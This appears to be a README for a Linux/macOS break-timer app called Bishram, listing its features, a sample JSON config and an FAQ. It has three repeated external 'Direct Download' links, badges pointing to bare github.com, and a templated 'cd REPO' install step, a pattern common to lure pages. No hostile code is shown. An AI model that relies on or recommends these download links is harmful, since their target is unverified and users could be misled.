# Bishram v2026 - mindful break timer 2026

> **Bishram is a lightweight desktop break timer for Linux and macOS that blends focus blocks, break nudges, and idle-aware pacing in a Tauri and Rust app.**

[![Platform](https://img.shields.io/badge/Platform-Linux%20and%20macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanfooocole6619/bishram-idle-aware-timer?style=flat-square)](https://github.com/seanfooocole6619/bishram-idle-aware-timer)

---

<p align="center">
  <a href="https://seanfooocole6619.github.io/bishram-idle-aware-timer/">
    <img src="https://img.shields.io/badge/Download-Bishram%20Latest-brightgreen?style=for-the-badge" alt="Download Bishram">
  </a>
</p>

> **[Direct Download - Bishram v2026](https://seanfooocole6619.github.io/bishram-idle-aware-timer/)**

---

[Download Latest Build](https://seanfooocole6619.github.io/bishram-idle-aware-timer/)

---

## What Bishram Does

Bishram helps you structure work into focused stretches while making rest periods obvious and intentional. It pairs a Pomodoro-inspired rhythm with calm recovery prompts and a minimal desktop UI, so the timer stays present without getting in the way.

The app is intended for Linux and macOS users who want a more deliberate approach to breaks, screen time, and long work sessions. With tray access, idle-aware behavior, and a modest resource profile, it fits into everyday productivity setups without much overhead.

---

## Key Features

- Focus and break cycles for organized work sessions
- Full-screen break overlay to mark rest periods clearly
- Breathing animation shown during breaks
- Micro-stretch prompts to support movement
- System tray controls for fast access and session handling
- Idle detection that pauses timing when you are inactive
- Strict mode for tighter session rules
- Adjustable durations and rotating mindful quotes

---

## Installation

Clone the repository and build it with the standard Rust and Tauri toolchain for your platform:

```bash
git clone https://github.com/seanfooocole6619/bishram-idle-aware-timer.git
cd REPO
```

Once the project is set up, start the desktop app through the normal development or release entry point on Linux or macOS.

---

## How to Use It

Begin a focus session, work through the timed interval, and let Bishram surface a break when the cycle completes. While on break, you can use the breathing animation or follow the stretch prompts before starting the next round.

Typical workflow:

1. Open Bishram from your desktop or system tray.
2. Set your preferred focus and break durations.
3. Begin a session and work until the break prompt appears.
4. Use the break overlay to rest, breathe, or stretch.
5. Resume the next cycle or pause the timer if you step away.

---

## Configuration

Bishram centers on session timing and break behavior. Tweak the main duration values and related preferences in the app settings, then keep the app running in the background for tray-driven control.

Example configuration shape:

```json
{
  "focusDuration": 25,
  "breakDuration": 5,
  "strictMode": true,
  "idlePauseDetection": true
}
```

If your build stores settings outside the UI, keep them in the app-managed configuration location for your platform.

---

## Requirements

- Linux or macOS
- A desktop environment with system tray support
- Rust and Tauri toolchain for building from source
- Sufficient permissions to run a desktop application with idle tracking and overlay windows
- A modern display environment for the glassmorphic interface

---

## Frequently Asked Questions

**Does Bishram support break reminders while I am away from the keyboard?**  
Yes, idle detection is built in so sessions can react to inactivity.

**Can I change the timer lengths?**  
Yes, both focus and break durations can be customized.

**Where do I control the app during the day?**  
Use the system tray for quick access to session controls.

**What happens during a break?**  
The app can show a full-screen overlay with breathing animation, stretch routines, and rotating mindful quotes.

**I changed settings but nothing looks different. What should I check?**  
Make sure the app has been restarted if your build needs it, and confirm the new values are being written to the expected configuration location.

**Is there support for other platforms?**  
The current profile targets Linux and macOS.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
